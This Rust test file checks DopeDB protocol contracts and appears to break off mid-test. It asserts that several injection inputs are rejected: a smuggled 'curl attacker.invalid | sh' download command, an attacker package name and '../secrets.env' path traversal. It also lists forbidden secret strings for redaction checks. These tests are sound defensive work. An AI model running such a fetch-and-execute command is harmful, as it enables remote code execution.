use dopedb_protocol::{
    canonical_knowledge_json_bytes, catalog::CatalogSnapshot, decode_arguments,
    knowledge_graph_artifact_size_allowed, valid_workspace_sync_cursor, AcpPluginArtifact,
    AcpPluginCompatibility, AcpPluginId, AcpPluginLicense, AcpPluginManifestV1, AcpPluginProvider,
    AcpPluginUpstream, AgentSessionRegisterArguments, AnalysisArticleRecord,
    AnalysisArticleVersionPayload, AppOpenCommand, AppOpenResult, AuthenticationRequirement,
    CatalogSearchCommand, CatalogShowCommand, CommandName, CommandSpec, ConnectionListCommand,
    ConnectionShowCommand, ConnectionTestCommand, DatabaseListCommand, DocumentRunCommand,
    ErrorCode, ExternalAgentConfig, ExternalAgentConfigCreateCommand, ExternalAgentProvider,
    ExternalAgentResourceScope, ExternalAgentSessionRevokeCommand,
    ExternalAgentSessionStartCommand, GraphBuildArtifactV1, ManagedAccessMode, ManagedLeaseRequest,
    ManagedLeaseResponse, OperationCancelCommand, OperationShowCommand, OperationWaitCommand,
    ProtocolError, QueryCancelCommand, QueryPlanCommand, QueryRunCommand, RequestEnvelope,
    ResponseEnvelope, RuntimeDiscovery, SchemaListCommand, SessionAuthentication,
    SharedAnalysisArticleCreate, SignedAcpPluginManifestV1, SkillInstallCommand,
    SkillRemoveCommand, SkillRepairCommand, SkillStatusCommand, SkillsGetCommand,
    SkillsListCommand, SourceReadCommand, SqlProposeCommand, StatusCommand, StatusResult,
    TableDescribeCommand, VersionCommand, VersionResult, WorkspaceSyncPageResponse,
    ACP_PLUGIN_MANIFEST_SCHEMA_VERSION, COMMAND_SCHEMA_VERSION,
    CONTROL_PLANE_CONTRACTS_SCHEMA_VERSION, GRAPH_BUILD_ARTIFACT_SCHEMA_VERSION,
    MANAGED_LEASE_CONTRACT_VERSION, MAX_KNOWLEDGE_GRAPH_ARTIFACT_BYTES, PROTOCOL_MAX,
};
use serde::Deserialize;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

fn value(source: &str) -> Value {
    serde_json::from_str(source).expect("fixture must be valid JSON")
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct CliCommandContract {
    command: CommandName,
    arguments: Value,
    #[serde(default)]
    result: Option<Value>,
    #[serde(default)]
    result_fixture: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct ControlPlaneContracts {
    schema_version: u32,
    workspace_sync: WorkspaceSyncGoldens,
    managed_lease: ManagedLeaseGolden,
    analysis_article_create: Value,
    analysis_article_acceptances: Vec<SemanticAcceptance>,
    semantic_rejections: Vec<SemanticRejection>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct SemanticAcceptance {
    name: String,
    mutations: Vec<SemanticMutation>,
}

#[derive(Clone, Copy, Deserialize)]
#[serde(rename_all = "camelCase")]
enum SemanticContract {
    WorkspaceSyncBootstrap,
    WorkspaceSyncIncremental,
    ManagedLeaseRequest,
    ManagedLeaseResponse,
    AnalysisArticleCreate,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct SemanticRejection {
    name: String,
    contract: SemanticContract,
    mutations: Vec<SemanticMutation>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct SemanticMutation {
    path: Vec<MutationPathSegment>,
    value: Value,
}

#[derive(Deserialize)]
#[serde(untagged)]
enum MutationPathSegment {
    Key(String),
    Index(usize),
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct WorkspaceSyncGoldens {
    bootstrap: Value,
    incremental: Value,
    reset: Value,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct ManagedLeaseGolden {
    contract_header: String,
    request: Value,
    response: Value,
}

fn apply_semantic_mutations(base: &Value, mutations: &[SemanticMutation]) -> Value {
    let mut candidate = base.clone();
    for mutation in mutations {
        let (last, parents) = mutation
            .path
            .split_last()
            .expect("semantic rejection path must not be empty");
        let mut cursor = &mut candidate;
        for segment in parents {
            cursor = match segment {
                MutationPathSegment::Key(key) => cursor
                    .get_mut(key)
                    .expect("semantic rejection object path must exist"),
                MutationPathSegment::Index(index) => cursor
                    .get_mut(*index)
                    .expect("semantic rejection array path must exist"),
            };
        }
        match last {
            MutationPathSegment::Key(key) => {
                cursor
                    .as_object_mut()
                    .expect("semantic rejection parent must be an object")
                    .insert(key.clone(), mutation.value.clone());
            }
            MutationPathSegment::Index(index) => {
                *cursor
                    .get_mut(*index)
                    .expect("semantic rejection array target must exist") = mutation.value.clone();
            }
        }
    }
    candidate
}

fn typed_cli_contract<C: CommandSpec>(request: &RequestEnvelope, result: &Value) {
    typed_contract::<C>(request, result, AuthenticationRequirement::TerminalSession);
}

fn typed_public_contract<C: CommandSpec>(request: &RequestEnvelope, result: &Value) {
    typed_contract::<C>(request, result, AuthenticationRequirement::None);
}

fn typed_contract<C: CommandSpec>(
    request: &RequestEnvelope,
    result: &Value,
    authentication: AuthenticationRequirement,
) {
    assert_eq!(C::AUTHENTICATION, authentication);
    let arguments = decode_arguments::<C>(request).expect("typed command arguments");
    assert_eq!(serde_json::to_value(arguments).unwrap(), request.arguments);
    let typed_result: C::Result =
        serde_json::from_value(result.clone()).expect("typed command result");
    assert_eq!(serde_json::to_value(typed_result).unwrap(), *result);
}

fn operation_summary_fixture() -> Value {
    json!({
        "operationId": "00000000-0000-0000-0000-000000000003",
        "connectionId": "00000000-0000-0000-0000-000000000001",
        "kind": "write_sql",
        "state": "pending_approval",
        "riskLevel": "medium",
        "payloadHash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "expiresAt": "2026-07-24T00:05:00Z",
        "createdAt": "2026-07-24T00:00:00Z",
        "updatedAt": "2026-07-24T00:00:00Z"
    })
}

fn resolve_result_fixture(contract: &CliCommandContract) -> Value {
    if let Some(result) = &contract.result {
        return result.clone();
    }
    match contract.result_fixture.as_deref() {
        Some("catalog-snapshot-v2") => value(include_str!("fixtures/catalog-snapshot-v2.json")),
        Some("database-list") => json!({
            "connectionId": "00000000-0000-0000-0000-000000000001",
            "databases": [
                {"name": "analytics", "isDefault": false},
                {"name": "app", "isDefault": true}
            ]
        }),
        Some("catalog-relation-0") => {
            let catalog = value(include_str!("fixtures/catalog-snapshot-v2.json"));
            json!({
                "connectionId": catalog["connectionId"],
                "database": catalog["database"],
                "relation": catalog["relations"][0]
            })
        }
        Some("operation-summary") => operation_summary_fixture(),
        Some("skills-list") => json!({
            "skills": [skill_summary_fixture()]
        }),
        Some("skills-get") => json!({
            "skill": skill_summary_fixture(),
            "guide": "# DopeDB CLI\n",
            "references": [
                {
                    "path": "references/safety.md",
                    "content": "# Safety\n"
                }
            ]
        }),
        Some("skill-status") => skill_status_fixture(),
        Some("skill-mutation") => json!({
            "status": skill_status_fixture(),
            "changedTargets": [],
            "backups": []
        }),
        fixture => panic!("unknown result fixture {fixture:?}"),
    }
}

fn skill_summary_fixture() -> Value {
    json!({
        "name": "dopedb-cli",
        "releaseRevision": 2,
        "appVersion": "0.3.3",
        "packageDigest": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
    })
}

fn skill_status_fixture() -> Value {
    json!({
        "skill": skill_summary_fixture(),
        "targets": [
            {
                "target": "codex",
                "displayName": "Codex",
                "installPath": "/home/user/.agents/skills/dopedb-cli",
                "state": "missing",
                "repairable": true,
                "currentRevision": 2,
                "installedRevision": null,
                "installedPackageDigest": null,
                "inventoryFingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "reason": null,
                "conflicts": []
            },
            {
                "target": "claude-code",
                "displayName": "Claude Code",
                "installPath": "/home/user/.claude/skills/dopedb-cli",
                "state": "managed_current",
                "repairable": true,
                "currentRevision": 2,
                "installedRevision": 2,
                "installedPackageDigest": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
                "inventoryFingerprint": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                "reason": null,
                "conflicts": []
            }
        ]
    })
}

fn assert_cli_command_types(command: CommandName, request: &RequestEnvelope, result: &Value) {
    match command {
        CommandName::ConnectionList => typed_cli_contract::<ConnectionListCommand>(request, result),
        CommandName::ConnectionShow => typed_cli_contract::<ConnectionShowCommand>(request, result),
        CommandName::ConnectionTest => typed_cli_contract::<ConnectionTestCommand>(request, result),
        CommandName::DatabaseList => typed_cli_contract::<DatabaseListCommand>(request, result),
        CommandName::CatalogShow => typed_cli_contract::<CatalogShowCommand>(request, result),
        CommandName::SchemaList => typed_cli_contract::<SchemaListCommand>(request, result),
        CommandName::TableDescribe => typed_cli_contract::<TableDescribeCommand>(request, result),
        CommandName::DocumentRun => typed_cli_contract::<DocumentRunCommand>(request, result),
        CommandName::QueryPlan => typed_cli_contract::<QueryPlanCommand>(request, result),
        CommandName::QueryRun => typed_cli_contract::<QueryRunCommand>(request, result),
        CommandName::QueryCancel => typed_cli_contract::<QueryCancelCommand>(request, result),
        CommandName::SqlPropose => typed_cli_contract::<SqlProposeCommand>(request, result),
        CommandName::OperationShow => typed_cli_contract::<OperationShowCommand>(request, result),
        CommandName::OperationWait => typed_cli_contract::<OperationWaitCommand>(request, result),
        CommandName::OperationCancel => {
            typed_cli_contract::<OperationCancelCommand>(request, result)
        }
        CommandName::SkillsList => typed_public_contract::<SkillsListCommand>(request, result),
        CommandName::SkillsGet => typed_public_contract::<SkillsGetCommand>(request, result),
        CommandName::SkillStatus => typed_public_contract::<SkillStatusCommand>(request, result),
        CommandName::SkillInstall => typed_public_contract::<SkillInstallCommand>(request, result),
        CommandName::SkillRepair => typed_public_contract::<SkillRepairCommand>(request, result),
        CommandName::SkillRemove => typed_public_contract::<SkillRemoveCommand>(request, result),
        unsupported => panic!("manifest contains unsupported command {unsupported}"),
    }
}

#[test]
fn public_protocol_goldens_match_pinned_agent_and_control_plane_contracts() {
    let source = include_str!("fixtures/query-plan-request.json");
    let request: RequestEnvelope =
        serde_json::from_str(source).expect("request fixture must decode");

    assert_eq!(request.protocol_version, PROTOCOL_MAX);
    assert_eq!(request.command_schema_version, COMMAND_SCHEMA_VERSION);
    assert_eq!(request.command.as_str(), "query.plan");
    assert_eq!(serde_json::to_value(&request).unwrap(), value(source));

    let debug = format!("{request:?}");
    assert!(debug.contains("<redacted>"));
    assert!(!debug.contains("fixture-only-session-capability"));

    let process_bound = SessionAuthentication::process_bound(uuid::Uuid::nil());
    let serialized = serde_json::to_value(process_bound).unwrap();
    assert_eq!(
        serialized["terminalSessionId"],
        uuid::Uuid::nil().to_string()
    );
    assert!(serialized.get("token").is_none());

    let registration = AgentSessionRegisterArguments {
        plugin_id: AcpPluginId::Claude,
        adapter_bundle_version: "1.0.0".into(),
        runtime_executable: "/Applications/DopeDB.app/Resources/node".into(),
        runtime_resolved_executable: "/Applications/DopeDB.app/Resources/node".into(),
        runtime_sha256: "ab".repeat(32),
        adapter_entrypoint: "/Users/test/acp/claude/1.0.0/index.js".into(),
        adapter_entrypoint_sha256: "cd".repeat(32),
        provider_cli_executable: "/opt/homebrew/bin/claude".into(),
        provider_cli_resolved_executable: "/opt/homebrew/lib/node_modules/claude/cli.js".into(),
        provider_cli_sha256: "ef".repeat(32),
    };
    assert!(registration.validate());
    assert_eq!(
        AcpPluginId::parse("dopedb.acp.claude"),
        Some(registration.plugin_id)
    );
    assert_eq!(AcpPluginId::parse("claude"), None);
    assert_eq!(AcpPluginId::parse("attacker.plugin"), None);
    assert_eq!(
        registration.plugin_id.local_cli_environment(),
        "CLAUDE_CODE_EXECUTABLE"
    );
    assert_eq!(AcpPluginId::Codex.local_cli_environment(), "CODEX_PATH");
    let mut registration_json = serde_json::to_value(&registration).unwrap();
    registration_json["package"] = json!("attacker/package@latest");
    assert!(serde_json::from_value::<AgentSessionRegisterArguments>(registration_json).is_err());
    let mut invalid_digest = registration;
    invalid_digest.runtime_sha256 = "AB".repeat(32);
    assert!(!invalid_digest.validate());

    let manifest = AcpPluginManifestV1 {
        schema_version: ACP_PLUGIN_MANIFEST_SCHEMA_VERSION,
        plugin_id: AcpPluginId::Claude,
        provider: AcpPluginProvider::Claude,
        adapter_version: "0.63.0".into(),
        adapter_bundle_version: "1.0.0".into(),
        adapter_entrypoint: "dist/index.js".into(),
        upstream: AcpPluginUpstream {
            repository: "https://github.com/agentclientprotocol/claude-agent-acp".into(),
            tag: "v0.63.0".into(),
            commit: "ab".repeat(20),
        },
        compatibility: AcpPluginCompatibility {
            acp_protocol_min: "2025-11-25".into(),
            acp_protocol_max: "2025-11-25".into(),
            node_version_min: "24.0.0".into(),
            node_version_max: "24.99.99".into(),
            dopedb_version_min: "0.3.33".into(),
            dopedb_version_max: "0.3.99".into(),
        },
        artifact: AcpPluginArtifact {
            url: "https://github.com/json-choi/dopedb/releases/download/acp-bundle-1/claude.tar.gz"
                .into(),
            sha256: "cd".repeat(32),
            signature: "fixture-signature".into(),
            key_id: "dopedb-acp-1".into(),
            packed_bytes: 1024,
            unpacked_bytes: 4096,
        },
        licenses: vec![AcpPluginLicense {
            name: "Apache-2.0".into(),
            path: "licenses/NOTICE.txt".into(),
        }],
        sbom_sha256: "ef".repeat(32),
        content_sha256: "de".repeat(32),
        released_at: "2026-08-08T00:00:00Z".into(),
        revoked_at: None,
        rollout_basis_points: 1_000,
    };
    assert!(manifest.validate());
    let signed = SignedAcpPluginManifestV1 {
        manifest: manifest.clone(),
        manifest_sha256: "12".repeat(32),
        signature: "fixture-manifest-signature".into(),
        key_id: "dopedb-acp-1".into(),
    };
    assert!(signed.validate_shape());
    let mut signed_json = serde_json::to_value(&signed).unwrap();
    assert_eq!(
        signed_json["manifest"]["pluginId"],
        json!("dopedb.acp.claude")
    );
    signed_json["downloadCommand"] = json!("curl attacker.invalid | sh");
    assert!(serde_json::from_value::<SignedAcpPluginManifestV1>(signed_json).is_err());
    let mut unknown_provider = manifest.clone();
    unknown_provider.provider = AcpPluginProvider::Codex;
    assert!(!unknown_provider.validate());
    let mut traversal = manifest.clone();
    traversal.adapter_entrypoint = "../adapter.js".into();
    assert!(!traversal.validate());
    let mut oversized = manifest;
    oversized.artifact.packed_bytes = 31 * 1024 * 1024;
    assert!(!oversized.validate());
    oversized.artifact.packed_bytes = 1024;
    oversized.compatibility.node_version_min = "25.0.0".into();
    assert!(!oversized.validate());

    let graph_source = include_str!("fixtures/graph-build-artifact-v1.json");
    let graph: GraphBuildArtifactV1 =
        serde_json::from_str(graph_source).expect("knowledge artifact fixture must decode");
    assert_eq!(graph.schema_version, GRAPH_BUILD_ARTIFACT_SCHEMA_VERSION);
    assert!(graph.validate());
    assert!(knowledge_graph_artifact_size_allowed(
        canonical_knowledge_json_bytes(&graph).unwrap().len(),
    ));
    assert!(knowledge_graph_artifact_size_allowed(
        MAX_KNOWLEDGE_GRAPH_ARTIFACT_BYTES,
    ));
    assert!(!knowledge_graph_artifact_size_allowed(
        MAX_KNOWLEDGE_GRAPH_ARTIFACT_BYTES + 1,
    ));
    let canonical_graph = canonical_knowledge_json_bytes(&graph).unwrap();
    let canonical_graph_sha256 = Sha256::digest(&canonical_graph)
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect::<String>();
    assert_eq!(
        canonical_graph_sha256,
        "cd6d4a78ca01576d8d2716ac1f168c1de3c75bbb7f73ded342edd93af28a55f0"
    );
    let canonical_vector = json!({
        "z": [{"β": 2, "a": 1}, "한글"],
        "a": {"😀": true, "\u{e000}": null, "2": "two", "10": "ten"},
    });
    let canonical_vector = canonical_knowledge_json_bytes(&canonical_vector).unwrap();
    assert_eq!(
        String::from_utf8(canonical_vector.clone()).unwrap(),
        "{\"a\":{\"10\":\"ten\",\"2\":\"two\",\"\":null,\"😀\":true},\"z\":[{\"a\":1,\"β\":2},\"한글\"]}"
    );
    let canonical_vector_sha256 = Sha256::digest(canonical_vector)
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect::<String>();
    assert_eq!(
        canonical_vector_sha256,
        "d6168ccb84693cd24b6b4d6c462dac4ab5b258b5566a684a0bbfd186fcfeebbd"
    );
    assert_eq!(serde_json::to_value(&graph).unwrap(), value(graph_source));
    let mut unsafe_graph = serde_json::to_value(&graph).unwrap();
    unsafe_graph["evidence"][0]["filePath"] = json!("../secrets.env");
    let unsafe_graph: GraphBuildArtifactV1 = serde_json::from_value(unsafe_graph).unwrap();
    assert!(!unsafe_graph.validate());
    let mut backslash_graph = serde_json::to_value(&graph).unwrap();
    backslash_graph["evidence"][0]["filePath"] = json!("src\\main.ts");
    let backslash_graph: GraphBuildArtifactV1 = serde_json::from_value(backslash_graph).unwrap();
    assert!(!backslash_graph.validate());
    let mut prerelease_graph = serde_json::to_value(&graph).unwrap();
    prerelease_graph["extractor"]["version"] = json!("1.0.0-beta");
    let prerelease_graph: GraphBuildArtifactV1 = serde_json::from_value(prerelease_graph).unwrap();
    assert!(!prerelease_graph.validate());

    let control_plane_source = include_str!("fixtures/control-plane-contracts-v1.json");
    let contracts: ControlPlaneContracts =
        serde_json::from_str(control_plane_source).expect("control-plane fixture must decode");
    assert_eq!(
        contracts.schema_version,
        CONTROL_PLANE_CONTRACTS_SCHEMA_VERSION
    );
    let workspace_id = uuid::Uuid::parse_str("11111111-1111-4111-8111-111111111111").unwrap();
    assert!(valid_workspace_sync_cursor(None));
    assert!(valid_workspace_sync_cursor(Some(9_007_199_254_740_991)));
    assert!(!valid_workspace_sync_cursor(Some(-1)));
    assert!(!valid_workspace_sync_cursor(Some(9_007_199_254_740_992)));
    for (fixture, cursor) in [
        (&contracts.workspace_sync.bootstrap, None),
        (&contracts.workspace_sync.incremental, Some(12)),
        (&contracts.workspace_sync.reset, Some(999)),
    ] {
        let page: WorkspaceSyncPageResponse =
            serde_json::from_value(fixture.clone()).expect("workspace sync golden must decode");
        assert!(page.valid_for(workspace_id, cursor));
        assert_eq!(serde_json::to_value(page).unwrap(), *fixture);
    }
    let request: ManagedLeaseRequest =
        serde_json::from_value(contracts.managed_lease.request.clone())
            .expect("managed lease request golden must decode");
    assert!(request.validate());
    assert_eq!(request.access_mode, ManagedAccessMode::Read);
    assert_eq!(
        serde_json::to_value(request).unwrap(),
        contracts.managed_lease.request
    );
    let schema_request: ManagedLeaseRequest =
        serde_json::from_value(json!({ "accessMode": "schema" }))
            .expect("managed schema lease request must decode");
    assert!(schema_request.validate());
    assert_eq!(schema_request.access_mode, ManagedAccessMode::Schema);
    assert_eq!(
        contracts.managed_lease.contract_header,
        MANAGED_LEASE_CONTRACT_VERSION
    );
    let response: ManagedLeaseResponse =
        serde_json::from_value(contracts.managed_lease.response.clone())
            .expect("managed lease response golden must decode");
    assert!(response.validate());
    assert_eq!(response.lease.provider, "gcpCloudSql");
    assert_eq!(response.lease.access_mode, ManagedAccessMode::Read);
    assert!(!response.lease.password.is_empty());
    assert!(!response
        .lease
        .connector
        .as_ref()
        .expect("fixture connector")
        .access_token
        .is_empty());
    let mut invalid_schema_provider = contracts.managed_lease.response.clone();
    invalid_schema_provider["lease"]["accessMode"] = json!("schema");
    let invalid_schema_provider: ManagedLeaseResponse =
        serde_json::from_value(invalid_schema_provider)
            .expect("known schema access mode must decode");
    assert!(!invalid_schema_provider.validate());
    let mut brokered_generic = contracts.managed_lease.response.clone();
    brokered_generic["lease"]["provider"] = json!("generic");
    brokered_generic["lease"]
        .as_object_mut()
        .expect("managed lease fixture")
        .remove("connector");
    let brokered_generic: ManagedLeaseResponse = serde_json::from_value(brokered_generic)
        .expect("brokered generic managed lease must decode");
    assert!(brokered_generic.validate());
    assert_eq!(brokered_generic.lease.provider, "generic");
    let article: SharedAnalysisArticleCreate =
        serde_json::from_value(contracts.analysis_article_create.clone())
            .expect("Analysis Article create golden must decode");
    assert!(article.validate());
    assert_eq!(
        serde_json::to_value(article).unwrap(),
        contracts.analysis_article_create
    );
    let mut legacy_article = contracts.analysis_article_create.clone();
    let current_definition = legacy_article["definition"].clone();
    legacy_article["definition"] = json!({
        "version": 2,
        "source": current_definition["source"],
        "title": current_definition["title"],
        "html": current_definition["html"],
        "question": "",
        "summary": "",
        "timezone": "UTC",
        "parameters": [],
        "queries": [{
            "id": current_definition["query"]["id"],
            "title": current_definition["query"]["title"],
            "connectionRole": current_definition["query"]["connectionRole"],
            "sql": current_definition["query"]["sql"],
            "parameterIds": [],
            "maxRows": current_definition["query"]["maxRows"],
            "maxBytes": current_definition["query"]["maxBytes"],
            "cacheTtlSeconds": 0,
            "columns": current_definition["query"]["columns"]
        }],
        "transforms": [],
        "metrics": [],
        "blocks": [{
            "id": "query_result",
            "kind": "table",
            "title": "Query result",
            "sourceNodeId": current_definition["query"]["id"],
            "width": 12,
            "config": {}
        }],
        "claims": [],
        "refresh": {
            "mode": "manual",
            "cron": null,
            "timezone": "UTC",
            "runnerId": null,
            "maxStalenessSeconds": 86400,
            "resultRetentionDays": 30,
            "shareReviewedResults": false
        },
        "warnings": []
    });
    let projected_legacy: SharedAnalysisArticleCreate =
        serde_json::from_value(legacy_article.clone()).expect("manual v2 Article must project");
    let projected_json = serde_json::to_value(projected_legacy).unwrap();
    assert_eq!(projected_json["definition"]["version"], 3);
    assert!(projected_json["definition"].get("query").is_some());
    assert!(projected_json["definition"].get("queries").is_none());
    let mut retired_version = contracts.analysis_article_create.clone();
    let retired_version_fields = retired_version
        .as_object_mut()
        .expect("Analysis Article fixture object");
    retired_version_fields.insert("state".into(), json!("live"));
    retired_version_fields.insert("ownerMemberId".into(), json!("member-fixture"));
    retired_version_fields.insert("deleted".into(), json!(false));
    let current_version: AnalysisArticleVersionPayload =
        serde_json::from_value(retired_version).expect("retired version payload must project");
    let current_version_json = serde_json::to_value(current_version).unwrap();
    assert!(current_version_json.get("state").is_none());

    let mut retired_record = contracts.analysis_article_create.clone();
    let retired_record_fields = retired_record
        .as_object_mut()
        .expect("Analysis Article fixture object");
    retired_record_fields.insert("state".into(), json!("live"));
    retired_record_fields.insert("ownerMemberId".into(), json!("member-fixture"));
    retired_record_fields.insert("updatedByMemberId".into(), json!("member-fixture"));
    retired_record_fields.insert("revision".into(), json!(2));
    retired_record_fields.insert("liveRevision".into(), json!(2));
    retired_record_fields.insert("liveRunId".into(), Value::Null);
    retired_record_fields.insert("latestSuccessfulRunId".into(), Value::Null);
    retired_record_fields.insert("createdAt".into(), json!("2026-09-03T00:00:00Z"));
    retired_record_fields.insert("updatedAt".into(), json!("2026-09-03T00:00:01Z"));
    let current_record: AnalysisArticleRecord =
        serde_json::from_value(retired_record).expect("retired Article record must project");
    let current_record_json = serde_json::to_value(current_record).unwrap();
    assert!(current_record_json.get("state").is_none());
    assert!(current_record_json.get("liveRevision").is_none());
    assert!(current_record_json.get("liveRunId").is_none());
    let mut scheduled_legacy = legacy_article.clone();
    scheduled_legacy["definition"]["refresh"]["mode"] = json!("scheduled");
    scheduled_legacy["definition"]["refresh"]["cron"] = json!("0 * * * *");
    assert!(serde_json::from_value::<SharedAnalysisArticleCreate>(scheduled_legacy).is_err());
    legacy_article["definition"]["queries"][0]["parameterIds"] = json!(["range"]);
    assert!(serde_json::from_value::<SharedAnalysisArticleCreate>(legacy_article).is_err());
    for acceptance in &contracts.analysis_article_acceptances {
        let candidate =
            apply_semantic_mutations(&contracts.analysis_article_create, &acceptance.mutations);
        let accepted = serde_json::from_value::<SharedAnalysisArticleCreate>(candidate)
            .is_ok_and(|value| value.validate());
        assert!(
            accepted,
            "shared semantic acceptance rejected: {}",
            acceptance.name
        );
    }
    for rejection in &contracts.semantic_rejections {
        let base = match rejection.contract {
            SemanticContract::WorkspaceSyncBootstrap => &contracts.workspace_sync.bootstrap,
            SemanticContract::WorkspaceSyncIncremental => &contracts.workspace_sync.incremental,
            SemanticContract::ManagedLeaseRequest => &contracts.managed_lease.request,
            SemanticContract::ManagedLeaseResponse => &contracts.managed_lease.response,
            SemanticContract::AnalysisArticleCreate => &contracts.analysis_article_create,
        };
        let candidate = apply_semantic_mutations(base, &rejection.mutations);
        let accepted = match rejection.contract {
            SemanticContract::WorkspaceSyncBootstrap => {
                serde_json::from_value::<WorkspaceSyncPageResponse>(candidate)
                    .is_ok_and(|value| value.valid_for(workspace_id, None))
            }
            SemanticContract::WorkspaceSyncIncremental => {
                serde_json::from_value::<WorkspaceSyncPageResponse>(candidate)
                    .is_ok_and(|value| value.valid_for(workspace_id, Some(12)))
            }
            SemanticContract::ManagedLeaseRequest => {
                serde_json::from_value::<ManagedLeaseRequest>(candidate)
                    .is_ok_and(|value| value.validate())
            }
            SemanticContract::ManagedLeaseResponse => {
                serde_json::from_value::<ManagedLeaseResponse>(candidate)
                    .is_ok_and(|value| value.validate())
            }
            SemanticContract::AnalysisArticleCreate => {
                serde_json::from_value::<SharedAnalysisArticleCreate>(candidate)
                    .is_ok_and(|value| value.validate())
            }
        };
        assert!(
            !accepted,
            "shared semantic rejection accepted: {}",
            rejection.name
        );
    }
    let mut drifted_response = contracts.managed_lease.response.clone();
    drifted_response["lease"]["unexpected"] = json!(true);
    assert!(serde_json::from_value::<ManagedLeaseResponse>(drifted_response).is_err());
}

#[test]
fn every_phase_six_cli_command_has_request_success_error_and_redaction_goldens() {
    let contracts: Vec<CliCommandContract> =
        serde_json::from_str(include_str!("fixtures/cli-command-contract-v14.json"))
            .expect("CLI command manifest must decode");
    let expected = [
        CommandName::ConnectionList,
        CommandName::ConnectionShow,
        CommandName::ConnectionTest,
        CommandName::DatabaseList,
        CommandName::CatalogShow,
        CommandName::SchemaList,
        CommandName::TableDescribe,
        CommandName::DocumentRun,
        CommandName::QueryPlan,
        CommandName::QueryRun,
        CommandName::QueryCancel,
        CommandName::SqlPropose,
        CommandName::OperationShow,
        CommandName::OperationWait,
        CommandName::OperationCancel,
    ];
    assert_eq!(
        contracts
            .iter()
            .map(|contract| contract.command)
            .collect::<Vec<_>>(),
        expected
    );

    for (index, contract) in contracts.iter().enumerate() {
        let request_id =
            uuid::Uuid::from_u128(0x018f_1111_2222_7333_8444_5555_0000_0000 + index as u128);
        let request_value = json!({
            "protocolVersion": PROTOCOL_MAX,
            "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
            "requestId": request_id,
            "authentication": {
                "terminalSessionId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee",
                "token": "fixture-only-session-capability"
            },
            "command": contract.command,
            "arguments": contract.arguments
        });
        let request: RequestEnvelope =
            serde_json::from_value(request_value.clone()).expect("golden request envelope");
        assert_eq!(serde_json::to_value(&request).unwrap(), request_value);

        let result = resolve_result_fixture(contract);
        assert_cli_command_types(contract.command, &request, &result);
        let success = ResponseEnvelope::success(PROTOCOL_MAX, request_id, result);
        let success_value = serde_json::to_value(&success).unwrap();
        let success_round_trip: ResponseEnvelope =
            serde_json::from_value(success_value.clone()).expect("golden success envelope");
        assert!(success_round_trip.is_ok());
        assert_eq!(
            serde_json::to_value(&success_round_trip).unwrap(),
            success_value
        );

        let error = ResponseEnvelope::failure(
            PROTOCOL_MAX,
            request_id,
            ProtocolError::new(ErrorCode::ScopeDenied, false),
        );
        let error_value = serde_json::to_value(&error).unwrap();
        let error_round_trip: ResponseEnvelope =
            serde_json::from_value(error_value.clone()).expect("golden error envelope");
        assert_eq!(
            error_round_trip.error().map(ProtocolError::code),
            Some(ErrorCode::ScopeDenied)
        );
        assert_eq!(
            serde_json::to_value(&error_round_trip).unwrap(),
            error_value
        );

        let request_debug = format!("{request:?}");
        let success_debug = format!("{success:?}");
        assert!(!request_debug.contains("fixture-only-session-capability"));
        assert!(!request_debug.contains("SELECT id"));
        assert!(!success_debug.contains("reader@example.test"));
        assert!(!success_debug.contains("aaaaaaaaaaaaaaaa"));

        let safe_response_snapshot = success_value.to_string().to_ascii_lowercase();
        for forbidden in [
            "fixture-only-session-capability",
            "postgresql://",
            "\"password\"",
            "\"credential\"",
            "\"token\"",
        ] {
            assert!(
                !safe_response_snapshot.contains(forbidden),
                "{} success snapshot contains forbidden material {forbidden}",
                contract.command
            );
        }
    }
}

#[test]
fn every_phase_four_skill_command_has_public_versioned_goldens() {
    let contracts: Vec<CliCommandContract> =
        serde_json::from_str(include_str!("fixtures/skill-command-contract-v1.json"))
            .expect("Skill command manifest must decode");
    let expected = [
        CommandName::SkillsList,
        CommandName::SkillsGet,
        CommandName::SkillStatus,
        CommandName::SkillInstall,
        CommandName::SkillRepair,
        CommandName::SkillRemove,
    ];
    assert_eq!(
        contracts
            .iter()
            .map(|contract| contract.command)
            .collect::<Vec<_>>(),
        expected
    );

    for (index, contract) in contracts.iter().enumerate() {
        let request_id =
            uuid::Uuid::from_u128(0x018f_4444_2222_7333_8444_5555_0000_0000 + index as u128);
        let request_value = json!({
            "protocolVersion": PROTOCOL_MAX,
            "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
            "requestId": request_id,
            "command": contract.command,
            "arguments": contract.arguments
        });
        let request: RequestEnvelope =
            serde_json::from_value(request_value.clone()).expect("Skill request envelope");
        assert!(request.authentication.is_none());
        let result = resolve_result_fixture(contract);
        assert_cli_command_types(contract.command, &request, &result);

        let response = ResponseEnvelope::success(PROTOCOL_MAX, request_id, result);
        response.validate().expect("Skill response invariant");
        let snapshot = serde_json::to_string(&response).unwrap();
        for forbidden in [
            "password",
            "credential",
            "session-capability",
            "postgresql://",
        ] {
            assert!(!snapshot.to_ascii_lowercase().contains(forbidden));
        }
    }
}

#[test]
fn active_app_commands_match_the_v1_golden_contract() {
    let version_request_source = include_str!("fixtures/version-request.json");
    let version_request: RequestEnvelope =
        serde_json::from_str(version_request_source).expect("version request must decode");
